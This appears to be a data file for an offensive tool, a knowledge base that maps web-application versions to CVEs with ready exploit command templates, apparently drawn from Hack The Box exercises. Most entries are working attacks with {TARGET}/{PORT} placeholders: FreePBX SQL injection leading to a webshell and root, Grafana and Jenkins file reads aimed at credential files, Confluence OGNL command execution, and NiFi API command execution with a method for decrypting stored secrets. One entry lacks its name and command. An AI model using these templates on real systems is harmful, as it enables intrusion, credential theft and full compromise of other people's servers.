_comment: Web-application version -> CVE knowledge base with guided (confirm-gated) exploitation hints. match: lowercased tokens that must all appear in the fingerprint (product/name/banner/notes). range: optional cve.satisfies() spec; empty means version-agnostic lead (verify the version). exploit: a ready command template with {TARGET}/{PORT} placeholders. note: what it does / what to grab.

entries.name: FreePBX endpoint unauthenticated SQLi -> RCE
entries.exploit: curl -s -G 'http://{TARGET}:{PORT}/admin/ajax.php' --data-urlencode 'module=FreePBX\modules\endpoint\ajax' --data-urlencode 'command=model' --data-urlencode 'template=x' --data-urlencode 'model=model' --data-urlencode "brand=x' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),0x7e))-- -"
entries.note: Unauth error-based SQLi in the endpoint module ajax handler (brand param); the module path bypasses the auth check. Stacked writes enabled -> INSERT a cron_jobs webshell dropper (echo <base64 php>|base64 -d >/var/www/html/shell.php) -> RCE as asterisk (~60s). Then incron: write /var/spool/asterisk/incron/api.fwconsole-commands.<base64(zlib(json[cmd,txn]))> -> the fwconsole-commands hook runs `fwconsole $cmd` as root -> command injection to root. Affects FreePBX 15/16/17 endpoint module. (HTB Connected.)

entries.name: Grafana plugin path traversal (arbitrary file read)
entries.exploit: curl --path-as-is 'http://{TARGET}:{PORT}/public/plugins/alertlist/../../../../../../../../etc/passwd'
entries.note: Unauthenticated arbitrary file read. Grab /etc/passwd, then /etc/grafana/grafana.ini and /var/lib/grafana/grafana.db for admin hashes/data-source creds.

entries.name: Atlassian Confluence OGNL injection RCE
entries.exploit: curl -s 'http://{TARGET}:{PORT}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd%22%2C%23a%29%29%7D/' -D -
entries.note: Unauthenticated OGNL injection; command output returns in the X-Cmd response header. Verify the exact version-affected range before relying on it.

entries.name: Jenkins CLI arbitrary file read
entries.exploit: java -jar jenkins-cli.jar -s http://{TARGET}:{PORT}/ -http connect-node @/etc/passwd
entries.note: Arbitrary file read via the CLI '@' arg expansion. Read /etc/passwd, then Jenkins secrets (secret.key, master.key, credentials.xml) to decrypt stored creds.

entries.note: Windows PHP-CGI (XAMPP) soft-hyphen 0xAD argument injection -> arbitrary PHP. Only Windows/CGI SAPI.

entries.name: Apache NiFi unauthenticated API -> RCE
entries.exploit: curl -s http://{TARGET}:{PORT}/nifi-api/access/config   # supportsLogin:false == NO AUTH -> full API. Then create an ExecuteProcess processor (POST /nifi-api/process-groups/root/processors, type org.apache.nifi.processors.standard.ExecuteProcess) with Command=/bin/bash, Command Arguments='-c;<cmd>' (Argument Delimiter ';'), connect success->funnel, run once, read stdout from the queued flowfile (GET /nifi-api/flowfile-queues/{conn}/flowfiles/{uuid}/content). CVE-2023-34468: a DBCPConnectionPool with an H2 JDBC URL also yields RCE. Decrypt flow.json.gz enc{} secrets with the nifi.sensitive.props.key (static salt 'NiFi Static Salt', PBKDF2-HMAC-SHA512 x160000, AES-GCM).
entries.note: Check /nifi-api/flow/about for the version and /nifi-api/access/config for supportsLogin. If login is unsupported the whole REST API is unauthenticated: ExecuteProcess = command execution as the nifi user; sensitive DBCP passwords in flow.json.gz are recoverable with the sensitive props key. (HTB Helix.)
